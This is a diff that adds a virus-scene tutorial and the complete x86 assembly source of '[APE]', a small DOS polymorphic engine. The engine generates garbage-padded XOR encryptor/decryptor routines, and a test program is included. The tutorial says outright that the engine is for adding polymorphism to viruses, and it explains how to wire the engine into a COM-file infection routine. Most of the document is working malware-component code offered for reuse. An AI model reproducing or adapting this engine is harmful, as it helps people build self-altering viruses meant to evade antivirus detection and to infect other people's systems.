@@ -1,0 +1,441 @@
+
+  HOW TO:
+  Another Polymorphic Engine (aka [APE]) coded by Bumblebee
+
+  Introduction
+  ~~~~~~~~~~~~
+   When Virus Buster's summoned virus scene people to a polymorphic compo
+  i was surprised by one fact: people didn't participate.
+   I asked myself: why? People has not interest about poly? After thinking
+  it some time i assumed that people had not the level or had not the time.
+   Well... if people had not the time there is nothing i can do about it, but
+  if people had not the level i can help a bit.
+
+   This is not a 'pure' tutorial. I need a good poly for win32 and i started
+  AGGRPE and from it i got this little piece of poly. It is not powerfull and
+  is only usefull 'cause is easy to modify and use.
+
+  The generated encryptor/decryptor
+  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+   It looks like:
+
+   generated:
+       pusha
+       mov     ?i,<offset of code to enc/dec>
+       { garbage 2/6 bytes }
+       mov     cx,<size to encode/decode /2>
+   cloop:
+       { garbage 2/6 bytes }
+       xor     word ptr cs:[?i],<cKey>
+       { garbage 2/6 bytes }
+       inc     ?i
+       inc     ?i
+       { garbage 2/6 bytes }
+       loop    cloop
+       popa
+       { garbage 2/6 bytes }
+       ret
+
+   Notice that 286 processor is needed. It has some bytes in a static place.
+  Moreover it uses a lame xor to encrypt. But has a thing for: it's size.
+  With only 240 bytes you can add a basic poly to your viruses.
+
+  Usage
+  ~~~~~
+   It works as a usual poly engine. Suppose you are in the main part of
+  the infection routine in your virus. As is usual in a encrypted virus you
+  need to make a clean copy of the ecrypted virus into memory. And let some
+  space (48 bytes is the max size of the generated proc) for the enc/dec
+  routine at the end of the virus. Then call the engine with right agrs
+  to put the proc in this place. The just make your own xor loop (remember
+  that the crypt key is a word).
+
+   The most complex stuff is to get the delta offset to put it in the
+  generated proc. I mean: the delta offset of the virus in the program
+  being infected. This can seem difficult... but don't worry: it's easy.
+
+   As example i'm going to explaint how to do it with COM files (this is
+  trivial). The delta offset in a COM appender is:
+
+       <prog being infected size>+<offset of code to encrypt/decrypt>
+
+   This implies that you cannot call the generated proc to encrypt the
+  virus. But is easy to generate a routine with the offset of code
+  to enc/dec as it is now in memory... and after the virus is encrypted
+  you will generate a new one with the delta offset of the file being
+  infected added. Or just make your own xor... (as i said before).
+
+   [APE] is used as follows:
+
+       in:
+               es:di           where to put the generated proc
+               cs:si           code to encrypt/decrypt
+               ax              crypt key
+               cx              cryptCodeSize /2
+       out:
+               cx              size of generated proc
+
+   It will not modify the registers, only cx that will contain the size
+  of the generated proc. This is ovious: you don't need to store the whole
+  48 bytes into the disk, just store only the bytes used by the engine to
+  generate the procedure.
+
+  Last words
+  ~~~~~~~~~~
+   [APE] is more a unoptimized pieze of shit than a good poly... but
+  small and usefull if you think poly is out your posibilities. Try to
+  understand it and feel fre to modify and use. I know this file could be
+  more clear and didactic but... erase it if you feel it's worth less.
+   I remeber i learned a lot reading sources of small polys when i started
+  coding viruses. The understanding of this file can help you a lot.
+
+   I won the Virus Buster's compo as the only one competitor... i hope this
+  will never happen again.
+
+                                                      The way of the bee
+
+  P.D. Excuse my english... i know it sucks ;)
+
+
+; -APE.INC------------------------------------------------------------------
+;
+;  here begins APE
+;
+; Another Polymorphic Engine (aka [APE]) coded by Bumblebee
+;
+;       in:
+;               es:di           where to put the generated proc
+;               cs:si           code to encrypt/decrypt
+;               ax              crypt key
+;               cx              cryptCodeSize /2
+;       out:
+;               cx              size of generated proc
+;
+;        engine size: 192 bytes
+; max generated size:  48 bytes
+;              total: 240 bytes
+;
+;       pusha
+;       mov     ?i,<offset of code to enc/dec>
+;       { garbage 2/6 bytes }
+;       mov     cx,<size to enc/dec /2>
+;   cloop:
+;       { garbage 2/6 bytes }
+;       xor     word ptr cs:[?i],<cKey>
+;       { garbage 2/6 bytes }
+;       inc     ?i
+;       inc     ?i
+;       { garbage 2/6 bytes }
+;       loop    cloop
+;       popa
+;       { garbage 2/6 bytes }
+;       ret
+;
+.286
+ape:
+        pusha
+        push    di
+        push    ax
+        cld
+        mov     byte ptr es:[di],061h           ; pusha
+        inc     di
+
+        mov     dx,si
+        lea     si,mainReg                      ; random si or di
+        mov     ah,1
+        call    random
+        add     si,ax
+        pop     bx
+        push    ax
+        movsb
+        mov     word ptr es:[di],dx
+        add     di,2
+        pop     dx
+
+        call    insShit
+
+        mov     al,0b9h                         ; mov cx,crypSize/2
+        mov     byte ptr es:[di],al
+        inc     di
+        mov     word ptr es:[di],cx
+        add     di,2        
+
+        push    di
+
+        call    insShit
+
+        lea     si,ixor                         ; random:
+        movsw                                   ; xor word ptr cs:[di],??
+        add     si,dx                           ; xor word ptr cs:[si],??
+        movsb
+        mov     word ptr es:[di],bx
+        add     di,2
+
+        call    insShit
+
+        lea     si,mainInc                      ; random:
+        add     si,dx                           ; add di,2
+        movsb                                   ; add si,2
+        dec     si
+        movsb
+
+        call    insShit
+
+        pop     bx                              ; loop
+        mov     al,0e2h
+        mov     ah,0feh
+        push    di
+        sub     di,bx
+        xchg    di,bx
+        sub     ah,bl
+        pop     di
+        mov     word ptr es:[di],ax
+        add     di,2
+        mov     byte ptr es:[di],061h           ; popa
+        inc     di
+
+        call    insShit
+
+        mov     byte ptr es:[di],0c3h           ; ret
+        inc     di
+
+        pop     cx
+        xchg    cx,di
+        sub     cx,di
+        mov     bp,sp
+        mov     word ptr ss:[bp+12],cx
+        popa
+        ret                                     ; proc size into cx
+
+insShit:
+        push    cx
+retryShit:
+        mov     ah,3
+        call    random
+        or      al,al
+        jz      retryShit
+        mov     cx,ax
+
+shitLoop:
+        lea     si,shit
+        mov     ah,7
+        call    random
+        cmp     al,7
+        jne     skipSubShit
+        dec     al
+skipSubShit:
+        push    cx
+        mov     cl,2
+        mul     cl
+        pop     cx
+        add     si,ax
+        movsw
+        loop    shitLoop
+
+        pop     cx
+        ret
+
+shit:           db      87h,0dbh, 50h,58h, 87h,0c9h, 52h,5ah
+                db      51h,59h, 87h,0d2h, 53h,5bh, 5bh,41h, 50h,45h, 5dh
+mainReg:        db      0bfh,0beh
+mainInc:        db      47h,46h
+ixor:           db      2eh,081h,35h,34h
+
+random:
+        in      al,40h
+        and     al,ah
+        sub     ah,ah
+        ret
+;
+;  here ends APE
+;
+; --------------------------------------------------------------------------
+
+; -APE.ASM------------------------------------------------------------------
+;
+;   Another Polymorphic Engine (aka [APE]) coded by Bumblebee
+;   test program
+;
+;       tasm /m3 ape.asm
+;       tlink /t ape.obj
+;
+apeSeg segment byte public
+                assume cs:apeSeg, ds:apeSeg
+                org 100h
+
+inicio:                                 ; test of the engine
+
+        push    cs
+        pop     es                      ; es:di -> where to place
+        lea     di,EncDest              ; encryptor/decryptor
+
+        lea     si,inicio               ; address of code to encrypt/decrypt
+                                        ; assuming (cs:si)
+
+        mov     ax,100h                 ; crypt key
+
+        mov     cx,100h                 ; size of code to encrypt/decrypt /2 
+
+        call    ape                    ; assuming ds=cs
+
+        mov     ax,4c00h
+        int     21h
+
+;
+;  here begins APE
+;
+; Another Polymorphic Engine (aka [APE]) coded by Bumblebee
+;
+;       in:
+;               es:di           where to put the generated proc
+;               cs:si           code to encrypt/decrypt
+;               ax              crypt key
+;               cx              cryptCodeSize /2
+;       out:
+;               cx              size of generated proc
+;
+;        engine size: 192 bytes
+; max generated size:  48 bytes
+;              total: 240 bytes
+;
+;       pusha
+;       mov     ?i,<offset of code to enc/dec>
+;       { garbage 2/6 bytes }
+;       mov     cx,<size to enc/dec /2>
+;   cloop:
+;       { garbage 2/6 bytes }
+;       xor     word ptr cs:[?i],<cKey>
+;       { garbage 2/6 bytes }
+;       inc     ?i
+;       inc     ?i
+;       { garbage 2/6 bytes }
+;       loop    cloop
+;       popa
+;       { garbage 2/6 bytes }
+;       ret
+;
+.286
+ape:
+        pusha
+        push    di
+        push    ax
+        cld
+        mov     byte ptr es:[di],061h           ; pusha
+        inc     di
+
+        mov     dx,si
+        lea     si,mainReg                      ; random si or di
+        mov     ah,1
+        call    random
+        add     si,ax
+        pop     bx
+        push    ax
+        movsb
+        mov     word ptr es:[di],dx
+        add     di,2
+        pop     dx
+
+        call    insShit
+
+        mov     al,0b9h                         ; mov cx,crypSize/2
+        mov     byte ptr es:[di],al
+        inc     di
+        mov     word ptr es:[di],cx
+        add     di,2        
+
+        push    di
+
+        call    insShit
+
+        lea     si,ixor                         ; random:
+        movsw                                   ; xor word ptr cs:[di],??
+        add     si,dx                           ; xor word ptr cs:[si],??
+        movsb
+        mov     word ptr es:[di],bx
+        add     di,2
+
+        call    insShit
+
+        lea     si,mainInc                      ; random:
+        add     si,dx                           ; add di,2
+        movsb                                   ; add si,2
+        dec     si
+        movsb
+
+        call    insShit
+
+        pop     bx                              ; loop
+        mov     al,0e2h
+        mov     ah,0feh
+        push    di
+        sub     di,bx
+        xchg    di,bx
+        sub     ah,bl
+        pop     di
+        mov     word ptr es:[di],ax
+        add     di,2
+        mov     byte ptr es:[di],061h           ; popa
+        inc     di
+
+        call    insShit
+
+        mov     byte ptr es:[di],0c3h           ; ret
+        inc     di
+
+        pop     cx
+        xchg    cx,di
+        sub     cx,di
+        mov     bp,sp
+        mov     word ptr ss:[bp+12],cx
+        popa
+        ret                                     ; proc size into cx
+
+insShit:
+        push    cx
+retryShit:
+        mov     ah,3
+        call    random
+        or      al,al
+        jz      retryShit
+        mov     cx,ax
+
+shitLoop:
+        lea     si,shit
+        mov     ah,7
+        call    random
+        cmp     al,7
+        jne     skipSubShit
+        dec     al
+skipSubShit:
+        push    cx
+        mov     cl,2
+        mul     cl
+        pop     cx
+        add     si,ax
+        movsw
+        loop    shitLoop
+
+        pop     cx
+        ret
+
+shit:           db      87h,0dbh, 50h,58h, 87h,0c9h, 52h,5ah
+                db      51h,59h, 87h,0d2h, 53h,5bh, 5bh,41h, 50h,45h, 5dh
+mainReg:        db      0bfh,0beh
+mainInc:        db      47h,46h
+ixor:           db      2eh,081h,35h,34h
+
+random:
+        in      al,40h
+        and     al,ah
+        sub     ah,ah
+        ret
+;
+;  here ends APE
+;
+
+EncDest:
+        nop
+
+apeSeg         ends
+end     inicio
+; ---------------------------------------------------------------------------
